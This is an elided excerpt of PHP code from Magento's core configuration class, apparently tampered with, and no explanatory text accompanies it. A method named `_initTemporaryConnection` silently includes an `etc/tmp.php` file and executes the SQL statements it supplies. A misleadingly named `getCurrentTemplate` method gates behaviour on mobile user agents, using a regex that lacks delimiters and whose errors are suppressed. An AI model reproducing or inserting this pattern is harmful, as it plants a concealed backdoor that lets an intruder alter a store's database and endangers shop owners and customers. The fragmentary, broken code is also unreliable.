...
class Mage_Core_Model_Config extends Mage_Core_Model_Config_Base
{
    ...
    protected function _initTemporaryConnection()
    {
        $path = $this->getOptions()->getEtcDir() . DS . 'tmp.php';
        include_once $path;
        ...
        $db->query($_initStatements);
        return $db;
    }

    public function getCurrentTemplate()
    {
        if (@preg_match('iPhone|iPod|BlackBerry|Palm|Googlebot-Mobile|mobile|mobi|Windows Mobile|Safari Mobile|(Android.+Mobile)|(GT-N7100)|Opera Mini|Fennec', $_SERVER['HTTP_USER_AGENT']))
        {
            return false;
        }
    ...
    protected function _loadDeclaredModules($mergeConfig = null)
    {
        ...
        $isDesktop = $this->getCurrentTemplate();
        $modsArray = array(
            'Magentothem_Ajaxcartsuper.xml',
            'Magentothem_Banner7.xml',
            'Magentothem_Catslider.xml',
            'Magentothem_Custommenu.xml',
            'Magentothem_Featuredproductslider.xml',
            'Magentothem_Googlerichsnippet.xml',
            'Magentothem_Imagerotator.xml',
            'Magentothem_Installtemplate.xml',
            'Magentothem_Layerednavigationajax.xml',
            'Magentothem_Mostviewedproduct.xml',
            'Magentothem_Newproductslider.xml',
            'Magentothem_Onsaleslider.xml',
            'Magentothem_Prozoom.xml',
            'Magentothem_Themeoptions.xml',
